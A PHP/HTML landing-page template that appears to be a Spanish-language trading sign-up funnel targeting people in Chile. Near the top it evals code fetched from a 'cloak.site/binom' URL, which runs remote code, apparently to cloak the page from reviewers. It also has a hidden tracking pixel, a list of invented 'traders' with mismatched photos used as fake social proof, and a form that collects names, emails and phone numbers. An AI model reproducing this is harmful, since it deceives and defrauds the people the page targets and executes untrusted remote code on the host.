<?php
$binomCampaingKey = 'km0e6xfsp0irwg6kisdn';
eval(file_get_contents('http://cloak.site/binom/no_redir/?bckey='.$binomCampaingKey));
...
$choisedCountry='';
$choisedCountryName = ''; //for country select in form
$siteCountryName = 'Chile'; //for country title in header
$siteCountryAlphaCode = 'CHL'; //for country logo in header

foreach ($countries as $key => $val) {
    if ($key == $ipCountry) {
        $choisedCountry = $key;
        $val['full_name'] && $siteCountryName = $val['full_name'];
        $val['alpha-3-code'] && $siteCountryAlphaCode = $val['alpha-3-code'];
        break;
    }
}
...
<head>
	...
	<style>
		...
		.form-group--phone .input-phone-code {
			width: 85px;
		}
		.form-group--phone .input-phone-number {
			width: calc(100% - 95px);
		}
		select.has-error {
...
<body>
	<img style="display:none;" width="1px" src="https://binomr.club/click.php?key=w73oqw4kgl3vznsi9826">	

<script>
  window.FUNNEL_CONFIG = '{"language":"en","ui_names":[{"name":"Gerardo","surname":"Elizondo","photo":"img/male/18.jpg"},{"name":"María José","surname":"Mojica","photo":"img/male/25.jpg"},{"name":"Guillermina","surname":"Gaona","photo":"img/male/12.jpg"},{"name":"Olivia","surname":"Velásquez","photo":"img/female/11.jpg"},{"name":"Jerónimo","surname":"Roque","photo":"img/female/13.jpg"},{"name":"María José","surname":"Benavídez","photo":"img/female/10.jpg"},{"name":"Santiago","surname":"Rico","photo":"img/male/9.jpg"},{"name":"Margarita","surname":"Tejeda","photo":"img/male/25.jpg"},{"name":"Verónica","surname":"Puga","photo":"img/female/21.jpg"},{"name":"Graciela","surname":"Solorzano","photo":"img/female/21.jpg"},{"name":"Juan","surname":"Garibay","photo":"img/female/8.jpg"},{"name":"Carmen","surname":"Irizarry","photo":"img/female/11.jpg"},{"name":"Sofia","surname":"Mayorga","photo":"img/female/6.jpg"},{"name":"César","surname":"Santana","photo":"img/female/14.jpg"},{"name":"Rodrigo","surname":"Carrera","photo":"img/male/19.jpg"},{"name":"Luz","surname":"Mascareñas","photo":"img/female/6.jpg"},{"name":"Joaquín","surname":"Delgadillo","photo":"img/female/6.jpg"},{"name":"Horacio","surname":"Ayala","photo":"img/male/15.jpg"},{"name":"Adela","surname":"Borrego","photo":"img/male/16.jpg"},{"name":"José Luis","surname":"Suárez","photo":"img/male/24.jpg"},{"name":"Mariana","surname":"Alonso","photo":"img/female/12.jpg"},{"name":"Joaquín","surname":"Sanches","photo":"img/female/13.jpg"},{"name":"Rosa","surname":"Gamez","photo":"img/female/16.jpg"},{"name":"Marcos","surname":"Magaña","photo":"img/male/15.jpg"},{"name":"Susana","surname":"Escobar","photo":"img/male/26.jpg"},{"name":"Elisa","surname":"Cabán","photo":"img/male/10.jpg"},{"name":"Santiago","surname":"Tamez","photo":"img/female/3.jpg"},{"name":"Carla","surname":"Huerta","photo":"img/male/6.jpg"},{"name":"Jorge Luis","surname":"Terán","photo":"img/female/6.jpg"},{"name":"María José","surname":"Gallegos","photo":"img/female/3.jpg"},{"name":"Barbara","surname":"Coronado","photo":"img/male/24.jpg"},{"name":"José Luis","surname":"Enríquez","photo":"img/female/1.jpg"},{"name":"Vicente","surname":"Martínez","photo":"img/female/18.jpg"},{"name":"Francisco","surname":"Palacios","photo":"img/male/15.jpg"},{"name":"Salvador","surname":"Juárez","photo":"img/female/26.jpg"},{"name":"Lola","surname":"Hernández","photo":"img/male/10.jpg"},{"name":"Ramón","surname":"Macías","photo":"img/female/21.jpg"},{"name":"Bernardo","surname":"Galarza","photo":"img/male/6.jpg"},{"name":"Jerónimo","surname":"Ríos","photo":"img/female/15.jpg"},{"name":"Olivia","surname":"Olivares","photo":"img/male/14.jpg"},{"name":"Olivia","surname":"Ramón","photo":"img/female/13.jpg"},{"name":"Marta","surname":"Trujillo","photo":"img/female/1.jpg"},{"name":"Miguel","surname":"Rosales","photo":"img/male/22.jpg"},{"name":"Agustín","surname":"Leal","photo":"img/male/18.jpg"},{"name":"Leticia","surname":"Solorzano","photo":"img/female/13.jpg"},{"name":"Eduardo","surname":"Pabón","photo":"img/female/16.jpg"},{"name":"Mónica","surname":"Nava","photo":"img/female/1.jpg"},{"name":"Cristobal","surname":"Gil","photo":"img/male/16.jpg"},{"name":"Marilu","surname":"Gil","photo":"img/male/2.jpg"},{"name":"Rafael","surname":"Jiménez","photo":"img/male/11.jpg"}],"country_data":{"index":212,"languages":["es"],"flag":"https://restcountries.eu/data/esp.svg","name":"Spain","nativeName":"España","country_code":"ES","currency_code":"EUR","currency_symbol":"€"},"validate_locale":{"email":{"remote":"Please enter a valid email"},"phone-number":{"remote":"Please enter a valid phone number"},"name":{"validText":"2 characters minimum, no numbers and special characters"},"lastname":{"validText":"2 characters minimum, no numbers and special characters"}},"currency":{"USDUSD":1,"USDEUR":0.89959},"recaptcha":"6LfpFrIUAAAAAOSv0jR7OHHuKNKpzXbE-vxx-QFN","is_sms_verification":false}'
</script>
					...
					<div _ngcontent-okf-c2="" class="widget_box" bis_skin_checked="1">
						<div _ngcontent-okf-c2="" class="country_box" bis_skin_checked="1">
							<div _ngcontent-okf-c2="" class="exclusive-offers-wrapper intro-margin-div none" bis_skin_checked="1">
								<div _ngcontent-okf-c2="" class="gtd-geo-country-flag-icon" style="background-image:url(<?='https://restcountries.eu/data/'.strtolower ($siteCountryAlphaCode).'.svg'?>); background-size: cover; background-position: center;background-repeat: no-repeat;" bis_skin_checked="1"></div>
								<div _ngcontent-okf-c2="" class="text" bis_skin_checked="1">
									<p _ngcontent-okf-c2="" class="purple" data-i18n="exclusive-offer-for">Exclusivo para</p><span _ngcontent-okf-c2="" class="red"><p _ngcontent-okf-c2="" data-i18n="traders-in-country">Negociadores en <?=$siteCountryName?></p></span></div>
							</div>
						</div>
						<div _ngcontent-okf-c2="" class="user_status animate bounceInDown" style="display:block" bis_skin_checked="1">
							<div class="media notification-top widget-people animate-next-item" data-init="person" bis_skin_checked="1">
								<div class="media-left" bis_skin_checked="1"><img data-attribute="src" data-content="photo" alt="Notification Photo" class="img-circle main_row user_status__img" width="57" height="57" src="img/female/6.jpg"></div>
								...
								<div _ngcontent-okf-c2="" class="hero__reg_form" id="signUpForm" bis_skin_checked="1">
                                  ...
                                  <?php if (isset($countries)) : foreach ($countries as $country => $country_data) : ?>
                                      ...
                                      ?>
																		...
																		<option
                                        <?=$selected;?>
																				data-phone-code="<?=$country_data['code']?>"
																				data-phone-placeholder="<?= isset($country_data['placeholder']) ? $country_data['placeholder'] : ''?>"
																				value="<?=$country_data['full_name'];?>">
                                        <?=$country_data['full_name'];?>
																		</option>
                                  <?php endforeach; endif; ?>
														...
														<div class="form-group form-group--phone">
															<input class="form-control input input-phone-code" name="phone-code" type="tel" value="441481" disabled placeholder="Código">
															<input class="form-control input input-phone-number" name="phone-number" type="tel" disabled data-placeholder="Número de teléfono">
														</div>
...
<script type="text/javascript" src="js/form.js?v=<?=time();?>" async=""></script>
